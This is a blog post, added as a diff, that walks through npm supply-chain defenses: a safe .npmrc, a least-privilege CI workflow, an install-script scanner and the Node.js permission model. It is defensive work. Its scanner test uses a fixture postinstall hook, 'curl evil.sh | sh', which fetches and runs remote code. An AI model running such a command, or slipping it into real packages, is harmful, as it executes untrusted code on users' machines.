@@ -1,0 +1,330 @@
+---
+title: 'Practical npm Supply-Chain Defenses for Node.js'
+uid: npm-supply-chain-defenses
+thumbnail: /assets/thumbnails/npm-supply-chain-defenses.svg
+category: Security
+tag: Node.js
+description: 'A walkthrough of my nodejs-supply-chain-security repo: a safe .npmrc, a least-privilege CI audit workflow, an install-script scanner, and the Node.js permission model, with the tests that prove each one works.'
+created: '2025-09-29T13:00:00.000Z'
+modified: '2025-09-29T13:00:00.000Z'
+---
+
+Look at the `node_modules` folder of almost any Node.js app and you'll find hundreds of packages you never chose directly. Every one of them runs with the same rights as your own code: it can read your files, see your environment variables (API keys included), open network connections, and spawn processes. Some of them get to run code before your app even starts, during `npm install`.
+
+That makes the dependency tree the biggest attack surface in most Node projects. The usual ways in are well known:
+
+- **Install scripts.** A `preinstall`, `install`, or `postinstall` hook runs a shell command on your machine or CI runner the moment the package is installed. No import needed.
+- **Typosquats and lookalikes.** A package one keystroke away from a popular name (think `expresss`), or one whose name looks like a file (`cross-env.js`), waiting for a typo in a `package.json`.
+- **Dependency confusion.** A public package published with the same name as your private one, hoping your tooling resolves the public copy.
+- **Compromised maintainers.** A legitimate, popular package gets a malicious release because someone phished or stole a maintainer's publish token. This is the hardest one, because the name is right and the package is one you already trust.
+
+I wanted a small, dependency-free reference for the defenses I actually use, so I built [nodejs-supply-chain-security](https://github.com/msanvarov/nodejs-supply-chain-security). It ships four things: a safe `.npmrc`, a CI workflow, an install-script scanner, and a demo of the Node.js permission model. This post walks through each one, what it stops, and why each setting is there.
+
+## The repo at a glance
+
+```text
+.npmrc                            safe npm defaults (copy into your project)
+.github/workflows/security.yml    CI: npm ci, audit, signatures, install-script scan
+.github/dependabot.yml            weekly updates with a 7-day cooldown
+scripts/find-install-scripts.js   lists dependencies that run code on install
+permission-demo/app.mjs           same app with and without --permission
+test/supply-chain.test.js         tests for the scanner and the permission model
+```
+
+It needs Node.js 22.13 or newer and has zero dependencies, so there's no `npm install` step. Everything uses built-ins: `node:fs`, `node:test`, `node:child_process`.
+
+## Defense 1: a safe `.npmrc`
+
+The cheapest defense is configuration. An `.npmrc` at the root of a project applies to everyone who runs npm there, including CI. Here's the whole file:
+
+```ini
+# Don't run preinstall/install/postinstall scripts from dependencies.
+# This is how most npm malware runs. Allow specific packages by running
+# `npm rebuild <pkg>` after reviewing them (see scripts/find-install-scripts.js).
+ignore-scripts=true
+
+# Write exact versions to package.json (no ^ or ~), so upgrades are deliberate.
+save-exact=true
+
+# Fail `npm audit` (and CI) only on high/critical issues.
+audit-level=high
+
+# Refuse to install if the Node version doesn't match "engines".
+engine-strict=true
+```
+
+| Setting | What it does | What it protects against |
+| --- | --- | --- |
+| `ignore-scripts=true` | npm skips lifecycle scripts from dependencies during install | Malware that runs from `postinstall` and friends |
+| `save-exact=true` | `npm install foo` writes `"1.2.3"` instead of `"^1.2.3"` | Silent upgrades to a release you never reviewed |
+| `audit-level=high` | `npm audit` only exits non-zero on high or critical advisories | Alert fatigue, so the CI gate stays on instead of being disabled |
+| `engine-strict=true` | Refuses to install when a package's `engines` doesn't match your Node version | Installs that "work" on the wrong runtime and break later |
+
+### Why `ignore-scripts` matters most
+
+Install scripts are the most direct path from "I added a dependency" to "someone ran code on my laptop". Turning them off by default removes that path for every package in the tree, including transitive ones you've never heard of.
+
+It doesn't break your own workflow. npm still runs a script you ask for by name, so `npm test` and `npm run build` work. The one thing to know is that npm also skips the `pre` and `post` hooks of your own scripts (`pretest`, `postbuild`) while this setting is on, so if you rely on those, call them explicitly.
+
+Some packages really do need an install step. Native addons and packages that download a platform binary are the usual examples. For those, review the script and then run it on purpose, for just that package:
+
+```bash
+npm rebuild <pkg> --ignore-scripts=false
+```
+
+I pass `--ignore-scripts=false` explicitly so the project-wide setting doesn't apply to the rebuild too. The point is that you choose which packages run install code, and you make that choice after looking. Finding them is what the scanner further down is for.
+
+### Exact versions and the lockfile
+
+`save-exact` pairs with two habits the README spells out: commit `package-lock.json`, and use `npm ci` instead of `npm install` in CI and Docker builds. `npm ci` installs exactly what the lockfile says and fails if the lockfile and `package.json` disagree. With exact versions in `package.json`, an upgrade shows up as a diff you can review, not as something that happened between two builds.
+
+While you're reviewing lockfile diffs, watch for two red flags: a new transitive dependency you didn't expect, and a `resolved` URL that points somewhere other than `registry.npmjs.org`.
+
+## Defense 2: a least-privilege CI workflow
+
+Config only helps if it's enforced, and CI is where it gets enforced. Here's `.github/workflows/security.yml`:
+
+```yaml
+name: security
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+  schedule:
+    - cron: '0 6 * * 1' # weekly, catches newly published advisories
+
+# Least privilege for the GITHUB_TOKEN. Add more per job only when needed.
+permissions:
+  contents: read
+
+jobs:
+  dependencies:
+    runs-on: ubuntu-latest
+    steps:
+      # In real projects, pin actions to a full commit SHA, e.g.
+      # actions/checkout@<40-char-sha> # v4. Tags can be moved by an attacker.
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
+
+      # npm ci installs exactly what the lockfile says and fails if it is out of date.
+      - run: npm ci --ignore-scripts
+
+      - name: Known vulnerabilities
+        run: npm audit --audit-level=high
+
+      - name: Registry signatures and provenance
+        run: |
+          if [ -n "$(ls -A node_modules 2>/dev/null)" ]; then npm audit signatures; else echo "no dependencies"; fi
+
+      - name: Packages with install scripts
+        run: node scripts/find-install-scripts.js # add --allow pkg1,pkg2 after reviewing them
+
+      - run: npm test
+```
+
+Taking it top to bottom:
+
+**The weekly `schedule`.** New advisories get published against versions you already have. Without a scheduled run, you only find out the next time someone opens a PR. The cron runs every Monday even if nobody touched the code.
+
+**`permissions: contents: read`.** The `GITHUB_TOKEN` gets read-only access by default. If a dependency does manage to run code in this job, the token it can reach can't push commits, open releases, or publish packages. Grant `id-token: write` or `packages: write` only to the job that actually publishes.
+
+**`persist-credentials: false`.** By default, `actions/checkout` leaves the token in the local git config so later steps can push. Nothing here needs to push, so this setting keeps later steps (and any dependency code) from reusing it.
+
+**Pin actions to a SHA.** The comment is there for a reason. A tag like `v4` can be moved to point at different code. A full 40-character commit SHA can't. The demo repo uses tags for readability; in a real project, pin the SHA and keep the version in a trailing comment.
+
+**`npm ci --ignore-scripts`.** This does two things: lockfile-exact installs, and no install scripts, even if someone deletes the `.npmrc`.
+
+**`npm audit --audit-level=high`.** This fails the build on known high and critical vulnerabilities in the installed tree.
+
+**`npm audit signatures`.** This checks the registry signatures and provenance attestations of what you installed, so you know the tarballs came from the npm registry as published. The `if` guard is only there because this repo has zero dependencies, which leaves nothing to verify.
+
+**The install-script scan.** This is the repo's own scanner, covered next. Without an allowlist it fails if *any* package in the tree has an install hook.
+
+Dependabot is configured next to the workflow, with one setting I think is underrated:
+
+```yaml
+    # Wait a week before proposing a new release. Most malicious versions are
+    # caught and unpublished within days. Security updates are not delayed.
+    cooldown:
+      default-days: 7
+```
+
+A cooldown means you're rarely the first person to install a brand-new release, which is exactly when a malicious version is most dangerous. Renovate (`minimumReleaseAge`) and pnpm (`minimumReleaseAge`) have the same idea. For a one-off install, `npm install --before=<date>` resolves versions as they were on that date.
+
+## Defense 3: an install-script scanner
+
+`ignore-scripts` stops install scripts from running, but you still need to know which packages *want* to run them. Some of those are legitimate, and a new one showing up in a routine upgrade is worth a closer look. `scripts/find-install-scripts.js` walks `node_modules` and lists every package that would run code at install time.
+
+The core of it:
+
+```js
+const HOOKS = ['preinstall', 'install', 'postinstall'];
+
+function visitPackage(dir) {
+  const real = realpathSync(dir);
+  if (seen.has(real)) return;
+  seen.add(real);
+  const manifestPath = path.join(dir, 'package.json');
+  if (existsSync(manifestPath)) {
+    const pkg = JSON.parse(readFileSync(manifestPath, 'utf8'));
+    const scripts = Object.fromEntries(HOOKS.filter((h) => pkg.scripts?.[h]).map((h) => [h, pkg.scripts[h]]));
+    const hooks = Object.keys(scripts);
+    // npm runs `node-gyp rebuild` automatically when binding.gyp exists and no install script is set.
+    if (!hooks.length && existsSync(path.join(dir, 'binding.gyp'))) hooks.push('install (implicit node-gyp)');
+    if (hooks.length) found.push({ name: pkg.name, version: pkg.version, hooks, scripts });
+  }
+  visitNodeModules(path.join(dir, 'node_modules'));
+}
+```
+
+A few details make this more than a `grep`:
+
+- **It recurses.** Each package's own nested `node_modules` gets visited, so a hook buried three levels deep still shows up.
+- **It handles scopes.** Entries starting with `@` are treated as a scope directory and walked one level further, so `@scope/native` is found.
+- **It catches the implicit hook.** A package with a `binding.gyp` file and no install script still runs code at install time, because npm runs `node-gyp rebuild` for it automatically. A scanner that only reads `scripts` would miss that.
+- **It deduplicates by real path.** `realpathSync` plus a `Set` means symlinked layouts don't get counted twice or loop forever. Dot entries like `.bin` and `.package-lock.json` are skipped.
+
+The CLI wrapper turns the list into a gate:
+
+```js
+const results = findInstallScripts(projectDir);
+const blocked = results.filter((r) => !allow.has(r.name));
+for (const r of results) {
+  const mark = allow.has(r.name) ? 'allowed' : 'REVIEW';
+  console.log(`[${mark}] ${r.name}@${r.version}  ${r.hooks.join(', ')}`);
+  for (const [hook, cmd] of Object.entries(r.scripts)) console.log(`    ${hook}: ${cmd}`);
+}
+if (!results.length) console.log('No packages with install scripts.');
+process.exitCode = blocked.length ? 1 : 0;
+```
+
+Every package with a hook is printed along with the exact command it would run, marked `allowed` or `REVIEW`. The exit code is 1 if anything is not on the `--allow` list. The workflow is: run it, read each command, add the ones you trust to `--allow pkg1,pkg2`, and from then on CI fails the moment a *new* package with an install hook enters the tree.
+
+If you use pnpm (v10+) or Bun, they already block dependency install scripts by default and use an explicit allowlist (`onlyBuiltDependencies` / `trustedDependencies`). This scanner gives npm users the same visibility.
+
+## Defense 4: the Node.js permission model
+
+Everything so far is about install time. But a malicious package doesn't need an install script. It can just do its damage when your app imports it. The Node.js permission model, stable since Node 22.13 and 23.5, limits what the whole process can do at runtime, including every dependency.
+
+The demo app tries five things and reports what happened:
+
+```js
+attempt('read own data file', () => readFileSync(path.join(here, 'data.txt')));
+attempt('read ../package.json', () => readFileSync(path.join(here, '..', 'package.json')));
+attempt('read /etc/hosts', () => readFileSync('/etc/hosts'));
+attempt('write to tmp', () => writeFileSync(path.join(tmpdir(), 'permission-demo.txt'), 'x'));
+attempt('spawn child process', () => execFileSync(process.execPath, ['--version']));
+
+if (process.permission) {
+  console.log('process.permission.has("fs.read", "/etc/passwd"):', process.permission.has('fs.read', '/etc/passwd'));
+}
+```
+
+The two npm scripts run it with and without the permission model:
+
+```json
+"demo:open": "node permission-demo/app.mjs",
+"demo:locked": "node --permission --allow-fs-read=./permission-demo permission-demo/app.mjs"
+```
+
+Here's what I got running both on my machine:
+
+```text
+$ npm run -s demo:open
+read own data file: allowed
+read ../package.json: allowed
+read /etc/hosts: allowed
+write to tmp: allowed
+spawn child process: allowed
+
+$ npm run -s demo:locked
+read own data file: allowed
+read ../package.json: ERR_ACCESS_DENIED
+read /etc/hosts: ERR_ACCESS_DENIED
+write to tmp: ERR_ACCESS_DENIED
+spawn child process: ERR_ACCESS_DENIED
+process.permission.has("fs.read", "/etc/passwd"): false
+```
+
+With `--permission`, everything is denied unless you grant it. The only grant here is `--allow-fs-read=./permission-demo`, so the app can read its own folder and nothing else. It can't step up one directory, can't read system files, can't write anywhere, and can't spawn a process. Each capability has its own flag: `--allow-fs-read`, `--allow-fs-write`, `--allow-child-process`, `--allow-worker`, and `--allow-addons`. A real service looks more like this:
+
+```bash
+node --permission \
+  --allow-fs-read=./src --allow-fs-read=./node_modules \
+  --allow-fs-write=./tmp \
+  server.js
+```
+
+Your code can also check before it acts, with `process.permission.has('fs.write', path)`, as the demo does for `fs.read`.
+
+Two caveats, and they matter. First, on the Node versions this repo targets, the permission model does **not** restrict network access, so a dependency can still make outbound requests. Second, it's a seatbelt, not a sandbox for hostile code. It shrinks the blast radius of a bad dependency, but you should still pair it with container hardening: a non-root user, a read-only filesystem, and no secrets the service doesn't need.
+
+## How the tests prove it
+
+The repo uses `node:test`, so `npm test` is just `node --test`. There are two tests, one per tool.
+
+The scanner test builds a fake `node_modules` in a temp directory with four packages: a clean one, an `evil` one with `postinstall: 'curl evil.sh | sh'`, a scoped native package with only a `binding.gyp`, and a `deep` package nested inside the clean one with a `preinstall`. It asserts the scanner finds exactly the three bad ones, in sorted order:
+
+```js
+const found = findInstallScripts(project);
+assert.deepEqual(found.map((f) => f.name), ['@scope/native', 'deep', 'evil']);
+assert.equal(found.find((f) => f.name === 'evil').scripts.postinstall, 'curl evil.sh | sh');
+
+const cli = (...args) => spawnSync(process.execPath, [scanner, project, ...args], { encoding: 'utf8' });
+assert.equal(cli().status, 1);
+assert.equal(cli('--allow', '@scope/native,deep,evil').status, 0);
+```
+
+That covers nesting, scopes, the implicit `node-gyp` hook, and the exit code with and without an allowlist.
+
+The permission test spawns the demo app twice and checks the output: in the open run, reading `../package.json` and spawning a child are allowed. In the locked run, the app's own file is allowed and the other four operations all fail with `ERR_ACCESS_DENIED`. So if a Node upgrade ever changed that behavior, the test would catch it.
+
+On my machine (Node 24), both pass:
+
+```text
+✔ finds install scripts in nested, scoped, and native packages
+✔ permission model blocks reads outside the allowed folder and child processes
+ℹ tests 2
+ℹ pass 2
+ℹ fail 0
+```
+
+## Running it yourself
+
+```bash
+git clone https://github.com/msanvarov/nodejs-supply-chain-security.git
+cd nodejs-supply-chain-security
+npm test             # tests for the scanner and the permission model
+npm run scan         # list packages in ./node_modules that run install scripts
+npm run demo:open    # app with normal Node permissions
+npm run demo:locked  # same app under the Node permission model
+```
+
+In this repo, `npm run scan` prints `No packages with install scripts.` because there are no dependencies. To scan your own project, point it at the project folder: `node scripts/find-install-scripts.js ../my-app`.
+
+## Beyond the four files
+
+The README also covers a few habits that don't fit in a config file:
+
+- **Have fewer dependencies.** Before adding a package, check whether Node already does it: `fetch`, `node:test`, `node:sqlite`, `util.parseArgs`, `util.styleText`, `crypto.randomUUID`, `--env-file`, `--watch`. Every dependency is code you trust plus everyone who can publish it.
+- **Scope private packages.** Use a scope like `@yourco/` and map it to your registry in `.npmrc` to avoid dependency confusion.
+- **Protect your own publishing.** Turn on 2FA for npm, publish from CI with trusted publishing (OIDC) instead of long-lived tokens, and use the `files` field so `.env` and keys never end up in a tarball.
+- **Don't combine `pull_request_target` with a checkout of PR code** in GitHub Actions.
+
+## Takeaways
+
+- [ ] Copy the `.npmrc`: `ignore-scripts`, `save-exact`, `audit-level=high`, `engine-strict`.
+- [ ] Commit the lockfile and use `npm ci` in CI and Docker.
+- [ ] Run `npm audit --audit-level=high` and `npm audit signatures` on every PR *and* on a weekly schedule.
+- [ ] Default `GITHUB_TOKEN` to `contents: read`, set `persist-credentials: false`, and pin actions to commit SHAs.
+- [ ] Scan for install scripts, review each one, and keep an explicit `--allow` list.
+- [ ] Add a release cooldown to Dependabot or Renovate.
+- [ ] Run services with `--permission` and only the `--allow-*` flags they need, inside a hardened container.
+
+None of these needs a paid tool or a new dependency, and together they cover install time, CI, and runtime. The full code, tests, and README are on GitHub: [msanvarov/nodejs-supply-chain-security](https://github.com/msanvarov/nodejs-supply-chain-security). Issues and pull requests are welcome.
